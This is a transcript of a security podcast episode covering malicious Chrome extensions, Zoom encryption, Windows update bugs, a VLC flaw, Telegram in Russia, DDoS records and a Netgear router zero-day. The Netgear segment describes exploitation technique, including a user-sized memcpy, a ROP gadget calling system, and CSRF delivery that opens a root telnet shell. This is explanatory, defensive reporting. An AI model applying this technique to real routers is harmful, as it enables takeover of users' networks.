So this report highlights that, they said:  "The attacker's infrastructure, including 15,160 malicious or suspicious domains and 111 malicious or fake Chrome extensions, collectively had approximately 33 million downloads."  They said that connections between the campaign and a number of traditional malware families had been seen.  The methods the attacker used to avoid detection by sandboxes, endpoint detection and response systems, web proxies and more they also got into; and the way Awake connected the dots leading back to a single domain registrar.  They said that the extensions posed as tools to improve web searches, to convert files between different formats, to perform security scans, and more.



But the extensions contained code to bypass Google's Chrome Web Store security scans, thus to get into the store in the first place.  Then, once downloaded, as had happened 33 million times, to take screenshots, to snag the global clipboard, to harvest authentication cookies, and to snag user keystrokes including passwords.  They said that they believed all the extensions were created by the same entity, although the company has not yet identified who that entity is.



The primary connection between all the extensions was that they sent user data back to domains that were all registered through the GalComm domain registrar.  And they said that many extensions appeared to share the same graphics and code base with only slight changes.  That similarity made scanning for their sibling extensions much easier.  Some of the extensions even shared version numbers and descriptions that no one had bothered to change from one to the other because they were just basically spitting these out, trying to sneak them past Google, and it had become a numbers game.



So anyway, someone had gotten lazy about covering their tracks.  You know, and I have two screenshots from the Chrome Web Store of two samples.  One calls itself ByteFence Secure Web Browsing.  Okay.  And they all did have lots of faked user feedback, you know, five-star browsing extensions, you know, the best antivirus software I have, or I've ever had or something.  You know, complete nonsense.  Also another one, Secured Search Extension.  It's like, you know, what?  Who knows?  But people were downloading it because, oh, look, I'd like to have my searches extended or secured.



So Awake said that by last month, when it reached out to Google, having finished its research, the 111 malicious extensions they had identified had been downloaded, oh, not quite 33:  32,962,951 times.  And I suppose the rule here is if you build it, they will download it.  And indeed that happened.  Based on their internal telemetry, Awake says that some of these extensions have been found on the networks of financial services, oil and gas, media and entertainment, healthcare and pharmaceutical companies, retailers, high tech, high education, and government organizations.  They are currently - well, they were - acting as backdoors into private works and as espionage tools.  Though they have no direct evidence to suggest that they've ever been used that way, the capability is there in them.



So after being notified, Google has so far proactively deactivated 106 out of the 111 identified Chrome extensions.  And they've been, you know, so they're obviously removed from the Web Store.  But they've been actually turned off in every user's browser.  The extensions are still installed, but they've been disabled and marked as malware.  So if you were interested, you go to chrome://extensions, which is the way your Chrome browser will show you what's installed.  And if it's been turned off, there's like a red "malware" that is saying, you know, we turned this off to protect you.  Also, if you see that, you should take a lesson from the fact that basically this is a numbers game, and you don't want to get bitten by this.



And it's probably a good moment for us to just mention that, you know, add-ons of all types have become the new front in the war on consumer trust.  We know that Apple and Google invest heavily in the safety and security of third-party apps and add-ons that they curate in their various app stores, but that nevertheless stuff is going to slip past.  Many people choose an Android device because, as we know, they are typically less expensive, and often because of the greater user freedom that comes with a more open platform.  And perhaps like your daughter Abby, Leo, they just don't like Apple for whatever reason.



LEO:  Right.



STEVE:  So they're going to give their money to Samsung or Google or another hopefully major Android brand because we know how important it is that these things get updates.  But the same openness which is given to the user is also available to the apps.  And the user is trusting those to be safe.  So the bottom line is, with these deals where you've got add-on apps and extensions, is that it is a pure numbers game.  The chance that any one particular app might be malicious is probably small because these companies are doing a good job.  But every additional app or add-on which is installed increases the probability that one of the growing collection is probably malicious.



So it's prudent not to let the crap accumulate in your browser with extensions or in your smartphone with add-on apps.  It's useful to occasionally page through what you've downloaded and remove the things that you no longer use.  Even though, Leo, I did hear you last podcast indicate that...



LEO:  I like to have that stuff.



STEVE:  ...you've got things you haven't touched for years, and you do not want them to be silently removed from your phone.



LEO:  No.  But you can turn that off, so I do.



STEVE:  That's true.



LEO:  Yeah.



STEVE:  Anyway, just download stuff with caution.  I have a few things.  I don't download add-ons in my browser because it is the case that every time you do something like that you're taking a slight risk, and they do add up.



Okay.  Zoom's encryption story, take three.  And I'm being kind only saying three.



LEO:  Uh-oh, yeah.



STEVE:  Last Wednesday in an apparent effort to deal with his company's recent spate of confused mixed messages regarding Zoom's actual plans for enforcing truly secure end-to-end encrypted teleconferences, Eric Yuan attempted to clean things up in a blog.  Eric wrote exactly the following:  "Since releasing the draft design of Zoom's end-to-end encryption on May 22nd, we've engaged with civil liberties organizations, our CISO council, child safety advocates, encryption experts, government representatives, our own users, and others to gather their feedback on this feature.  We've also explored new technologies to enable us to offer end-to-end encryption to all tiers of users.  Today, Zoom released an updated end-to-end encryption design on GitHub."  And I looked, and it was just like commas and dots and things were changed, no biggies.



He said:  "We are also pleased to share that we have identified a path forward that balances the legitimate right of all users to privacy and the safety of users on our platform.  This will enable us to offer end-to-end encryption as an advanced add-on feature for all users around the globe, free and paid, while maintaining the ability to prevent and fight abuse on our platform."



LEO:  Yeah, there's your clause.



STEVE:  Uh-huh.  "To make this possible, Free/Basic users seeking access to end-to-end encryption will participate in a one-time process that will prompt the user for additional information, such as verifying a phone number via a text message.  Many leading companies perform similar steps on account creation to reduce mass creation of abusive accounts.  We're confident that by implementing risk-based authentication, in combination with our current mix of tools  including our Report a User function  we can continue to fight and prevent abuse."



Then under "additional information" he said just four bullet points:  "We plan to begin early beta of the end-to-end encryption feature in July.  All Zoom users will continue to use AES-256 GCM transport encryption as the default encryption, one of the strongest encryption standards in use today."  And note that's the way they're differentiating.  They're saying "transport encryption" as opposed to full...



LEO:  End-to-end.



STEVE:  ...end-to-end encryption.



LEO:  Right.



STEVE:  Then they say:  "E2EE will be an optional feature as it limits some meeting functionality, such as the ability to include traditional dial-up phone lines or VoIP hardware conference room systems.  Hosts will toggle E2EE on and off on a per-meeting basis."  And actually I believe they meant only on, because they have previously said it will absolutely not be turn-offable once it's been turned on.  Then finally the fourth bullet point:  "Account administrators can enable and disable end-to-end encryption at the account and group level."  And he finishes:  "We are grateful to those who have provided their input on our E2EE design, both technical and philosophical.  We encourage everyone to continue to share their views throughout this complex, ongoing process."



LEO:  It feels to me like, honestly, they're trying to distract everybody from the real issue, which is is it really end-to-end encryption?



STEVE:  Yes.



LEO:  And I'm still unclear on that.  What is your opinion on that?



STEVE:  So my opinion is they have royally screwed the pooch, and no one is ever going to trust them again.  So they're trying to say - and Alex has sort of talked about this.  I'd seen references to it, the idea being that, if they can - their concern is that there's rampant abuse of encrypted teleconferences because of the abuse of anonymity.  And that, if they can trade enhanced security for some reduction in anonymity, that that will put off the abusers who will not want to give a phone number, which is then tied to their conferencing.



LEO:  Yeah, no, all that makes sense.  But it doesn't address the end-to-end encryption part of it.  It's just talking about authentication.  I keep feeling like they're trying to say "Pay no attention that.  Here's what we're going to do for authentication."  But when they talk about this turning on this better-than-transport encryption, at the same time as they talk about that, don't they still say, but we'll be able to help law enforcement, or we'll be able to give, I mean, don't they imply?



STEVE:  Well, you notice there was none of that language in his blog posting.



LEO:  Right.



STEVE:  What we know happened is there was a huge backlash from the industry at large at the idea that encryption was not going to be available for the free tier.  And then there was all this back-and-forth doubletalk about it.  And, you know, my feeling is, after their out-of-the-gate stumbles, they had one chance at redemption.  The very first initial problems they jumped on.  But as we know, through a bizarre lack of messaging coherence, they just confused everybody.  And I think...



LEO:  Well, I think that's intentional is what I think.  Go ahead.  What do you think?



STEVE:  Maybe.  I think they lost any hope forever of convincing those who most have a need for easy-to-use, really encrypted, warrant-proof conferencing, that Zoom is the place to get it.  It just - no one is going to trust them or believe them again.  And as you said, even now, there's still some confusion.



LEO:  It's not clear.  Is it warrant-proof or isn't it?  By the way, that's a good test.  And they've implied that they will help, but only in the case of child sex abuse material.  But that's not the issue.  And I feel like there's a lot of hand waving.  I don't even think the free versus paid is the issue if none of it is end to end.  And that's the real issue.



STEVE:  Correct.  And their original issue with paid is that paying means there's a money trail, and that creates a tighter identity confirmation.



LEO:  Yeah, but that's not the question I had.  Maybe some people have it.



STEVE:  No, no, I completely agree.  And but you know, Leo, what's interesting, because I thought about this, no one has any similar concern about Apple.  Apple has played the encryption issue exactly right, from day one.  Everyone knows that Apple's products are as absolutely and truly secure as Apple is capable of making them.  Any mistakes that they or others find are immediately fixed.  And Apple's very public fights with law enforcement have only proven to enhance their well-deserved reputation.



LEO:  Does FaceTime use end-to-end?  They don't have any - that's warrant-proof encryption in FaceTime, at least person-to-person; right?



STEVE:  Yes.



LEO:  Apple doesn't have the keys to that.



STEVE:  Well, no.  And I still argue that, if you're not managing the keys, somebody else is.



LEO:  That's my point exactly, yeah.



STEVE:  And if somebody else is, that gives them the opportunity, whether they take it or not.



LEO:  Right.



STEVE:  So nothing we've seen has shown how they could engineer themselves out of that position.  And we've seen things that, like, well, iCloud isn't encrypted.  And if the terrorists hadn't, or if the FBI hadn't shut down and restarted the phone, blah blah blah blah blah.  I mean...



LEO:  Yeah, we know Apple retains the keys to iCloud.  That's known.



STEVE:  Yeah.  



LEO:  It is the case, though, that an iPhone has a Secure Enclave, generates its own keys.  And so a point-to-point call in FaceTime...



STEVE:  Yes.



LEO:  ...should be fully encrypted.  There's no Apple in between.  I don't know how group calling - this is the challenge Zoom faces, and everybody else, is group calling; right?  Because you have to route video, unencrypted video at the server.



STEVE:  Right.  Well, and I've listened to you talk about this across TWiT.  And I agree with you that it's unclear... 



LEO:  It's just unclear.



STEVE:  ...how much Zoom-style teleconferencing really needs ber-secure end-to-end encryption anyway.



LEO:  Right.



STEVE:  As we know, their post-COVID usage explosion is almost entirely replacing meetings such as yoga classes.



LEO:  Yeah, who cares?



STEVE:  And traditional classrooms.  They were publicly accessible and never particularly secure in the first place.



LEO:  But there are dissidents.  There are psychotherapists and psychiatrists.  There are medical doctors.  You know, HIPAA has been suspended for the nonce.  So it's not even a HIPAA issue.  But still there's some reasons people might want to have really private conversations on Zoom, not all of them nefarious.  If you run a Jitsi server, you have transport encryption, decrypted at the server.  But if you run the server, you still retain the keys.  So it is possible to do something like that, if you run your own server.  I just don't - I think, it's my guess, and I wish they'd be clear about this, that they do retain the keys to it.  Right?  Zoom does.  We've seen nothing to say they don't.



STEVE:  Well, the document says that their technology does negotiate end-to-end, and that they have no visibility into the keys.



LEO:  Oh, okay.  Okay. 



STEVE:  So if that document is adopted, and that's sort of the question, too, is that it's not open source...



LEO:  That's just - that's just - right.



STEVE:  It's just a design goal.



LEO:  Right.



STEVE:  Yeah.



LEO:  Well, anyway, all right.  It's good.



STEVE:  So anyway, I just wanted to touch on this briefly.  Last week we covered some of the many problems people were experiencing after installing Windows 10 June updates.  Of course among them was the "printer not turned on before starting  Windows," and the more significant "printing no longer works at all" after the updates.  As we were podcasting, Microsoft was acknowledging some printing problems and issuing an out-of-cycle emergency update to fix one of several problems.  But apparently, and incredibly, neither of the problems we talked about.  There is another one which they did fix, a crash in the print spooler - that also prevents printing - in the Windows Message Center.



Microsoft says:  "An out-of-band optional update is now available on Microsoft Update Catalog to address a known issue in which certain printers may be unable to print after installing updates released on June 9th, 2020."  The announcement noted that the issue could cause the print spooler to "generate an error or close unexpectedly" - and of course it's never supposed to close, so any closure would be unexpected - "when attempting to print, and no output will come from the affected printer."



They also said:  "And you might also encounter issues with the apps you are attempting to print from, such as receiving an error, or the app might close unexpectedly."  And the issue "might also affect software-based printers, such as when printing to PDF."  So pretty much everything.



And you know, as I was reading that, and this is optional update available in the catalog, it's unclear to me what users who are not proactive about managing Windows are expected to do because Microsoft recommends users to install one of the three consecutively numbered updates - 4567512, 513, or 514 - which are flagged as "optional cumulative updates for Windows 10."  And that spans versions 1909, 03, 1809, and 1803.  But only if their devices are affected by that issue.  And they noted that these optional Windows 10 updates are not available from Windows Update and will not install automatically.



And then, since they broke printing across all versions of Windows, two days later, last Thursday, they dropped another collection of similar optional cumulative updates to address that same printing issue on the versions that that first drop hadn't covered.  I'm not supposed to say 2004 because that's confusing.  2004, 1709, 1703, 1607, and 1507.  So all the way back.  And Windows 8.1, Windows Server 2012, and Server 2016.  So they just really messed things up.  But still nothing about the "be sure to turn the printer on first" problem.



And what seems to me is that these things being optional, where the affected user must go to get the fix for the breakage is puzzling because it sure seems to me that, if Microsoft is going to automatically break somebody's Windows 10 machine, they really should also automatically fix what they've broken, especially when they've given now users no choice about whether to accept and install the forcible breakage in the first place.



I don't know.  It's just a little confusing at the moment.  I did see some reference to them going to be changing their Insider program and maybe rearranging things.  I hope that they're able to get a handle on these things that they've been messing up recently.  And maybe these are optional until next month.  They didn't say that if you just waited until July, which is approaching, then they'll get all these fixed in the next cumulative rollup.  I hope so because otherwise less proactive users are just going to stay broken.



I mentioned the VLC media player, or VideoLAN.  I've got it installed on my machines.  It's a great multipurpose media player.  Version 3.0.11 fixes what they described as a severe remote code execution flaw.  So worth doing.  It's available now, 3.0.11, for the desktop versions - Windows, Mac, and Linux.  And in addition to some random bug fixes and improvements, the main reason to update, if you're a user of VLC, is that it fixes a severe security vulnerability.  And this of course follows the theme of interpreters are hard to make perfect, and unfortunately perfection is required.



It's tracked as a CVE-2020-13428, a buffer overflow in VLC's H26X packetizer.  And they said, if exploited, it would allow attackers to execute code under the same security level as the user.  So the good news is that it's running as a client of the OS in the user's account.  It has no reach down into the kernel.  The bad news is you still don't really don't want to be running someone else's deliberately malicious code in your computer.



And according to their security bulletin, this vulnerability can be exploited by creating a specially crafted file, like a malicious video which could be posted somewhere, and having the user open it in VLC.  That would be the exploitation of a remote code execution.  VLC would be used to read a file that had been crafted to take over your machine when that happens.  So the VideoLAN guy said that the vulnerability would most likely only crash the player.  They warn that it could be used by an attacker to execute code under the security level of the user remotely.  But as we know, crashes are where exploits are born.  So the fact that it's a crash today doesn't mean that's all it will stay.



So anyway, I would recommend anybody using VLC, just launch it.  I did that last night when I saw this.  I'd been running 3.0.8.  And immediately upon starting it I got the news that 3.0.11 was available, and did I want to install it.  So it's very quick to do, and just a heads-up that it's probably worth doing. 



Also a puzzling update from Roskomnadzor, which is my American pronunciation of a probably very different-sounding...



LEO:  Make it sound like Boris Badenov.  You'll be okay.  Roskomnadzor.



STEVE:  Exactly.  As we've spoken of them often and had fun with their name, the bureau serving as Russia's media watchdog, okay.  Here's what's weird.  They said that Telegram has agreed to help Russian law enforcement fight against extremists and terrorist content shared on Telegram, on the Telegram platform.  I have a link to a Russian - a gov.ru page that I just figured that my fonts all broke when I clicked it because - no.



LEO:  Cyrillic.



STEVE:  So no help there.  But I did find some coverage of this in various places.  Apparently the Russian government has lifted what was largely an ineffective two-year ban on Telegram's instant messaging service, which we know is encrypted.  And, boy, all you have to do is just have it show up in Russian and it's encrypted.  In a message posted on its website, Roskomnadzor said it lifted the ban after Russian prosecutors reached an agreement with Telegram's founder, Pavel Durov.  Russian officials said that Durov "expressed readiness to counter terrorism and extremism."



Okay, now, that doesn't actually say that Pavel agreed to drop his drawers for Russia.  So we don't really know what has happened.  The details about this collaboration, such as it might be, between Telegram and Russian officials has not been made public anywhere that I could find.  Now, to remind our users, Russia officially banned Telegram a little over two years ago, on April 13th of 2018.  That ban followed Telegram's refusal to cooperate with Russia's FSB, their federal security bureau, which is their primary intelligence service.



At the time, FSB investigators tried to obtain the encryption keys from Telegram to decrypt conversations between two suspects that were under investigation in the 2017 St. Petersburg Metro bombing.  I'm sure that Pavel said, "We don't have the keys.  Our system is designed end-to-end secure.  Sorry, we can't help you."  That wasn't the answer they were looking for.  So being viewed as refusing to cooperate, the FSB filed a lawsuit which, surprise, it eventually won in the Russian Supreme Court early in 2018.  Russian officials initially fined Telegram, but then the Russian courts also ordered Roskomnadzor to ban the app inside Russia.  Basically, you know, we're going to shut you down, you bad Telegram people.



However, Roskomnadzor had a difficult time enforcing the ban over the past two years.  Telegram constantly changed its servers' IP addresses and also employed a technique known as "domain fronting" to bypass the ban.  Domain fronting is basically using different domains as a front for the actual Telegram service.  And that allowed Russian users to continue using its service.



And recall that in one famous, or maybe now infamous, botched effort to ban the service in Russia, Roskomnadzor applied a wide area blanket block which affected more than 19 million Amazon and Google Cloud IP addresses, blocking out countless legitimate services inside Russia such as all of Google's services, online games, banking sites, cryptocurrency exchanges, and mobile apps.  They also, in a continuing effort, banned 50 VPN and proxy services that Russians were using to access Telegram.  Throughout all of this, Telegram remained extremely popular in Russia; and, despite the ban, was often used by Russian politicians themselves because, after all, secure; right?  Encrypted; right?  So the officials were trusting Telegram to keep their conversations safe from FSB surveillance.  So again, sort of a political win for Telegram for saying no to law enforcement.  Just as Apple has benefited from their own stance.



So a few days prior to Roskomnadzor lifting the ban, as they did last week, the Russian news site Znak reported that Russian members of Parliament had introduced a new bill to have the app unbanned, though it's unclear whether the bill played any role in Roskomnadzor's lifting of the ban.  However, I did some more digging, and I discovered that in April of 2020 the government of Russia started using Telegram themselves to spread information related to the COVID-19 outbreak.



LEO:  Ah.  Well, that's what people use.



STEVE:  Yes.  So perhaps that factored into this change.  They thought, well, okay, we don't like it, but it's secure.  People are using it.  We have not been able to block it.  Now this is getting kind of embarrassing.  So let's lift the ban and make it officially legal again.  I also found that Roskomnadzor had not indicated how the two organizations had been able to overcome the issue of Telegram's end-to-end encryption, if indeed they actually had.  And I think they hadn't.  It did not say whether it now had access to messages, or whether changes had been made to the platform.  And neither Telegram nor Pavel Durov, who both regularly use Telegram to communicate with their own users, have yet commented publicly on the lifting of the ban.



So my own reading between the lines says that the Russian government, as I said, secretly regretted their opposition to Telegram, especially considering that it's the instant messaging platform of choice for many of them themselves.  And perhaps the need to communicate through COVID-19 demonstrated the platform's versatility and utility; and they thought, well, since we can't actually stop it anyway, let's just legitimize it.  So, cool.



Okay.  This is one of the two biggies of the week.  Netgear.  There have previously been various other reports of random routers, even bunches of routers, having exploitable problems.  But those reports haven't risen to the level required to raise an alarm for me to share with our listeners because their problems have invariably been LAN-side issues, rather than WAN-side problems.  And while LAN-side issues are not nothing, they do not directly expose the router to external attack.  They're only vulnerable if an attacker has already gotten themselves inside, behind the router, on the LAN, and onto the network.  And of course once any attacker has accomplished that, it's pretty much the case that all bets are off.



However, when a router is weak enough on the inside, there is one troubling case where an equally weak attacker, meaning attacker that doesn't have much attack strength, might be strong enough.  And that's when a user browses to a malicious website.  When that happens, the attacker's code is running in the visitor's browser, which exists on the LAN.  We were recently talking about how JavaScript code was able to launch its own HTTP queries using the so-called "AJAX" primitives.  AJAX is the abbreviation for Asynchronous JavaScript and XML.  Which, again, it allows a web page to be active, to alter its contents to establish a communication back to the originating web server and so forth.



So there are 79 Netgear models - 79 - so vulnerable, and we'll see in detail why in a moment, that just surfing to a malicious website could allow the code the browser downloads to blindly connect to the network's local Netgear router and cause it to open a telnet session, with port and command prompt as root.



Okay.  So let's step back a bit.  I should note that I created a link for our listeners.  And Leo, you may be interested to bring it up.  It's grc.sc/netgear, just so anybody with a Netgear device, you're going to want to be seeing whether your one of 79 Netgear router models may be vulnerable and may have firmware available:  grc.sc/netgear.  SC, of course, for shortcut.



Okay.  So here's what's going on.  An unpatched zero-day vulnerability exists in 79 Netgear router models.  It allows an attacker to take full control over any of those 79 Netgear model devices from within the LAN, even from code running inside a user's web browser.  The vulnerability was independently discovered by two researchers.  Naturally it exists in the HTTPD, the HTTPD daemon used to manage the router.  In other words, that's the router's web-based router management server, web server, which you typically connect to with your browser.  Unfortunately, your browser can connect to it when driven by script in the same way.



One of the two researchers released a detailed explanation of the vulnerability, a proof-of-concept exploit, and scripts to find vulnerable routers.  So the hackers of the world are already clued in.  All of this is public.  The proof of concept and the scripts are up on GitHub, and their detailed explanation is here in the show notes.  So it is a fully detailed technical blog, and the posting is quite detailed.  So I'm going to excerpt from the full posting, enough to touch on the most interesting and important highlights.  And it's well written, and this is a perfect look into the process of exploitation and just a classic mistake.



So this guy started with a Netgear R7000.  He says:  "After a long day of hard research, it's fun to relax, kick back, and do something easy.  While modern software development processes have vastly improved the quality of commercial software as compared to 10 to 15 years ago, consumer network devices have largely been left behind.  Thus, when it's time for some quick fun and a nice confidence boost, I like to analyze Small Office/Home Office (SOHO) devices.  This blog describes one such session of auditing the Netgear R7000 router, analyzing the resulting vulnerability, and the exploit development process that followed.  The write-up and code for the vulnerability described in this blog post can be found in our NotQuite0DayFriday repository."



He says:  "The first step when analyzing a SOHO device is to obtain the firmware.  Thankfully, Netgear's support website hosts all the firmware for the R7000.  The Netgear R7000 version 1.0.9.88 firmware used in this blog post can be downloaded from the website.  After unzipping the firmware, we'll use binwalk to extract the root filesystem from the firmware image.  While the router may have many services worth analyzing, the web server is often the most likely to contain vulnerabilities."  And I'll add that it's also always listening with a port open to the LAN, so an obvious target of opportunity, if you could do anything useful on the LAN side.



So they continue:  "In SOHO devices like the R7000, the web server must parse user input from the network and run complex CGI functions that use that input.  Furthermore, the web server is written in C and has had very little testing, and thus it is often vulnerable to trivial memory corruption bugs.  As such," he writes, "I decided to start by analyzing the web server HTTPD.  As we're interested in how the web server mishandles user input, the logical place to begin analyzing the web server is the receive function.  The receive" - abbreviated R-E-C-V - "is used to retrieve the user input from a connection.



"Thus by looking at the references to the receive function in the web server, we can see where the user input begins.  The web server has two helper functions which call receive, one used in the HTTP parser and one used to read the responses from Dynamic DNS requests to oemdns.com."



He says:  "We'll focus on the former use, as shown below in the Hex-Rays decompiler."  And he has a snippet of decompiled code.  Of course Hex-Rays, remember, is the IDA, the Interactive Disassembler, which is the industry's longest running and very popular way of decompiling something which is only available in binary.



Okay.  So I'm going to go through this, but this won't take long, unfortunately.  He says:  "After the call to read content - the receiver helper function - the parser does some error checking, combines the received content with any previously received content, and then looks for the strings named 'mtenFWUpload'" - as in firmware upload - "and \r\n\r\n" - which of course is carriage return/line feed, carriage return/line feed.  And that's, you know, two CRLFs is typically the way you end ASCII-based input.  And he says:  "...in the user input.



"If the user input contains these strings" - that is, that mtenFWUpload and the two CRLFs - "the rest of the user input after these strings is passed to the abCheckBoardID function.  Grepping the firmware's root file system, we can see that the string mtenFWUpload is referenced from the files www/UPG_upgrade.htm" - in other words, firmware upgrade - "and also Modem_upgrade.htm," he says, "and thus we can conclude that this is part of the router's upgrade functionality."



Then in his blog posting he breaks to post "1996 Calling.  They Want Their Vulnerability Back."  He says, and here it is:  "Following the user input, we next look at the abCheckBoardID function.  This function, shown below, expects the user input to be the firmware file for the R7000.  It parses the user input to validate the magic value (bytes 0-3), obtains the header size (bytes 4-7), and checksum (bytes 36-49); and then copies the header to a stack buffer.  This copy, performed via the memcpy function, uses the size specified in the user input."  All right, everybody.  I'll say that again.  The copy, performed via memcpy, uses the size specified in the user input.  In other words...



LEO:  Well, the user knows best.  Of course.



STEVE:  ...it is trivial to overflow the stack buffer.  Unbelievable.



LEO:  Yeah.



STEVE:  He says:  "In most modern software, this vulnerability would be unexploitable."  First of all, having that vulnerability is unconscionable.  The idea that you're going to take the input from the input is nuts.  But that's what this does.



He says:  "Modern software typically contains stack cookies which would prevent exploitation.  However, the R7000 does not use stack cookies.  In fact, of all the Netgear products which share a common codebase" - thus the reason that 79 of them all fall to this exploit - only, he writes, "the D8500 firmware version 1.0.3.29 and the R6300v2 firmware versions 1.0.4.12 through .20 use stack cookies.  However, later versions of the D8500 and R6300v2 stopped using stack cookies, making this vulnerability once again exploitable against all of them, as well."



He says:  "This is just one more example of how SOHO device security has fallen behind compared to other modern software."  Then he says:  "In addition to lacking stack cookies, the web server is also not compiled as a Position-Independent Executable, and thus cannot take advantage of ASLR."  You know, Address Space Layout Randomization.  "As such, it's trivial to find" - what he says, he writes - "a ROP gadget" - of course that's Return-Oriented Programming gadget, meaning the tail end of some existing routine that has a snippet of code that he wants to repurpose, he said - "within the HTTPD binary, such as the one shown below, that will call the system with a command taken from the overflown stack."



And so it's just two instructions:  MOV RO,SP, meaning from register zero and the stack pointer, and then a branch if less, BL, to system.  Meaning it is trivial to put your own command on the stack and have the system execute it.  He says:  "The exploit in GRIMM's NotQuite0DayFriday repository uses this gadget" - this Return-Oriented Programming gadget - "to start the telnet daemon as root listening on TCP port 8888 and not requiring a password to log in."



And:  "As the vulnerability occurs before the Cross-Site Request Forgery (CSRF) token is checked, this exploit can be served via a CSRF attack.  If a user with a vulnerable router" - that is, any of those 79 - "browses to a malicious website, that website could exploit the user's router via the browser."  He said:  "The developed exploit" - and it's all there - "demonstrates this ability by serving an HTML page which sends an AJAX request containing the exploit to the target device.  However, as the CSRF web page cannot read any responses from the target server, it's not possible to remotely fingerprint the device."  You could do other things to do that, like from the web page establish a communication with a web browser, get the version number and so forth.



Anyway, he says:  "So the attacker must know the model and version that they are exploiting."  These guys didn't want to build a full-blown, seriously deadly proof of concept because it would be immediately weaponized by bad guys.



They said:  "Many SOHO devices share a common software base, especially among devices created by the same manufacturer.  As such, a vulnerability in one device can normally be found in similar devices by the same manufacturer.  In this case I," he writes, "was able to identify 79 different Netgear devices and 758 firmware images that included a vulnerable copy of the web server.  This vulnerability affects firmware as early as 2007."  That was the WGT624v4, version 2.0.6.  "Given the large number of firmware images, manually finding the appropriate gadgets is infeasible.  Rather, this is a good opportunity to automate gadget detection."  And he goes on to do that.  But anyway, everybody gets the idea.



He notes at the end of his post that on June 15th, so, what, Monday before last, Vietnam's ZDI group, the Zero Day Initiative, published an advisory by "d4rkn3ss" from VNPT ISC, that's the Vietnam ZDI, on this vulnerability.  That's the other group that independently discovered this.  Adam's GRIMM group discovered the issue independently and reported the vulnerability directly to Netgear on May 7th of this year.  So, what, a little over like a month and a half ago.



So obviously anyone owning and using a Netgear router of any model should start checking in with Netgear for news of new firmware for their particular router.  And through this I've been assuming that no one would be crazy enough to have enabled web-based remote administration on their router's WAN interface.  It is an option.  It is, thank goodness, disabled by default.  So somebody would have to turn it on on purpose.  If by any chance you have done that for some reason, immediately turn it off or update your firmware.  But really, having a web browser on the WAN interface, as this exact problem demonstrates, is crazy.  This is a zero-authentication attack on an extremely insecure web server.  You do not want that facing the public Internet.



At the time of this podcast, Netgear had only addressed the problem for eight of their 79 vulnerable router models.  Their advisory was first published last Thursday the 18th.  And they have since updated it three times as they prepare and release additional firmware updates.  I'm quite certain this is a nightmare for them, and they're doing everything as quickly as possible to get the firmware fixed and released.  I mean, I found this page, that grc.sc/netgear, which of course is my shortcut that redirects to their much longer URL.  It was the top item on their support advisories.  So you can also just go to Netgear support and look at security advisories, and it's right there, "Security advisory for multiple vulnerabilities on some" - uh-huh - "routers, mobile routers, modems, gateways, and extenders."  So, I mean, it's across their product line.  They just used the same bad web server everywhere.



I have a Netgear cable modem that I love, and an ASUS WiFi router.  But the Netgear cable modem is outboard of my pfSense firewall router, and the ASUS is inboard, serving not as a router, only as a WiFi access point.  So for me, having that professional-grade pfSense firewall provides a great deal of peace of mind.  I can't recommend it highly enough.  You can install on any little network-enabled gizmo - a Raspberry Pi, a little Intel fanless box, anything.  Or just buy one of their little appliances for a couple hundred dollars.  Anyway, it's great technology.



Meanwhile, DDoS is alive and well and growing.  We haven't touched on DDoS attacks much recently because there hasn't been much news.  But breaking a record is always newsworthy, and the  record for the largest sustained DDoS attack was recently broken.  The second highest previous record was set at a whopping 1.3 terabits per second - that's 1.3 trillion bits per second, 1.3 thousand billion bits per second - which hit GitHub back in February of 2018.  That was topped a month later by the second, current - what had been the record holder since at 1.7 terabits per second, which was aimed at NetScout in March of 2018.  Both NetScout and GitHub, both of those attacks abused Internet-exposed memcached servers to achieve their massive bandwidth.



But now, although they didn't advertise it at the time, in an incident quietly disclosed in its AWS Shield Threat Landscape report, Amazon's AWS service disclosed that they had successfully mitigated the largest ever DDoS recorded, weighing in at 2.3 terabits per second, 2.3 thousand billion bits per second.  They did not disclose the intended target, but they did indicate that the attack was carried out using hijacked CLDAP servers, resulting in three days of elevated threat for its AWS Shield staff.



CLDAP, which is Connectionless Lightweight Directory Access Protocol, which is an alternative to the older LDAP protocol, which is used to search, connect, and modify Internet-shared directories, it's been abused for DDoS attacks since late 2016.  And CLDAP servers are known to be able to amplify DDoS traffic by 56 to 70 times its initial size, making it a highly sought-after protocol, and also a common option provided and used by DDoS-for-hire services.  Attacks this large, 2.3 terabits, are fortunately still quite rare, and may surprise those running attack mitigation services.  There are far more much smaller attacks happening pretty much continuously.



Cloudflare, who mitigated a 550 gig per second attack during the first quarter of 2020, noted that 92% of all the DDoS attacks they mitigate, that is, Cloudflare, or mitigated during the same first quarter of 2020, were under 10 gigabits per second, 92.  So in other words, only 8% topped 10 gigabits per second.  And they also noted that 47% of all the attacks were even smaller, under 500 megabits per second.  So it's very much a curve with a long tail and then a sharp exponentiation at the very end.  Very few super high bandwidth attacks.  Lots of much lower bandwidth attacks.



And as we know, DoS and DDoS are one of the consequences of the Internet's autonomous packet routing system which has served us so well from the start.  As long as it's possible to query a remotely located public server with a UDP packet that does not require TCP's roundtrip, and if the query's source IP can be spoofed without being blocked on its way out onto the public Internet, and if the remote server's reply to the query is much larger than the query itself, amplified DDoS spoofing attacks are going to be a feature of our global Internet of networks until we eliminate some of those conditions for that kind of attack.



So a piece of errata.  We don't often have much.  I titled this "My, how time flies."



LEO:  Uh-oh.



STEVE:  And as I mentioned at the top of the show,  Leo, our off-the-cuff and inaccurate discussion of how long we've been at this podcast generated some conversation over in GRC's Security Now! newsgroup, the upshot of which was someone named Rob Allen summarizing our current position quite succinctly.  Rob wrote:  "We are currently in the 15th season, or Year 15, of the show, though it has only been 14 years and 10 months since August 18, 2005.  On August 17th, the show will have been on the air for 15 full years, making August 11th the final episode of year/season 15.  Season/year 16 will start August 18, 2020 with Episode 780."  So we're at 772, so eight episodes from now we will be beginning Year 16 of this podcast.  So there we have it.



LEO:  Wow, wow, wow.



STEVE:  We've been almost 15 years.  And the gang over in the newsgroup mentioned TimeAndDate.com, which is a pretty slick site for performing various sorts of time and date math.  I did a quick computation about when our final podcast would occur.



LEO:  Oh.



STEVE:  Yeah.  I thought that would be interesting.  So since we're at 772, and we run out of digits of course at 999,  that's 227 remaining podcasts.  So at one podcast per week, that's 1,589 days, which is 4.35 years.  But since we'll have some holiday best-of, that'll extend that number by another four weeks, since we'll cross four holiday events.  So it's really around 1,617 days from now.  I dropped that number into TimeAndDate.com, launching from today, what is 1,617 days from now.  And that places our final 999th podcast at Tuesday, November 26th, 2024.



LEO:  Perfect.



STEVE:  Which really isn't that far away, you know.



LEO:  No, shut up.  Don't say that.



STEVE:  We're going to be there in no time.



